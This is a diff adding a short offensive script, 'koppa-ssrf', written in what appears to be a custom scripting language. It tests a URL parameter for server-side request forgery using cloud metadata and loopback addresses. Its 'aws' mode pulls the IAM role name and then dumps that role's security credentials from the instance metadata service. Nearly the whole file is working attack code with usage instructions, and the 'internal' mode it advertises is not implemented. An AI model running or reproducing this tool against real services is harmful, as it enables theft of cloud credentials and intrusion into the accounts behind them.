@@ -1,0 +1,51 @@
+# koppa-ssrf v1.0 — SSRF detection and cloud metadata extraction
+# Usage: koppa run koppa-ssrf <url> <param> [scan|aws|internal]
+
+import http, encode, log, report
+
+let CLOUD_META = ["http://169.254.169.254/latest/meta-data/",
+                  "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+                  "http://metadata.google.internal/computeMetadata/v1/",
+                  "http://192.168.0.1/", "http://127.0.0.1/"]
+
+fn cmd_scan(url, param) {
+    log.info("===== SSRF Scan: {url} [{param}] =====")
+    let findings = []
+    for target in CLOUD_META {
+        let enc  = encode.url_encode(target)
+        let resp = http.get("{url}?{param}={enc}")
+        if resp.status == 200 and resp.body.len > 0 {
+            log.success("[+] SSRF -> {target}")
+            log.info(resp.body)
+            findings.push(report.finding("SSRF", "Critical", "Reached: {target}"))
+        }
+    }
+    if findings.len == 0 { log.warn("[-] No SSRF detected") }
+    return findings
+}
+
+fn cmd_aws(url, param) {
+    log.info("===== AWS Metadata Extraction =====")
+    let role_url = encode.url_encode("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+    let resp1    = http.get("{url}?{param}={role_url}")
+    let role     = resp1.body.trim()
+    if not role { log.warn("[-] No IAM role found"); return }
+    log.success("[+] IAM Role: {role}")
+    let cred_url = encode.url_encode("http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}")
+    let resp2    = http.get("{url}?{param}={cred_url}")
+    log.success("[+] Credentials:\n{resp2.body}")
+}
+
+fn main() {
+    let url   = __args__[0]
+    let param = __args__[1]
+    let mode  = __args__[2]
+    if not url or not param {
+        log.warn("Usage: koppa run koppa-ssrf <url> <param> [scan|aws]")
+        return
+    }
+    log.info("===== KOPPA SSRF Tester v1.0 =====")
+    if not mode or mode == "scan" { cmd_scan(url, param) }
+    if mode == "aws"  { cmd_aws(url, param) }
+    log.success("SSRF test complete!")
+}
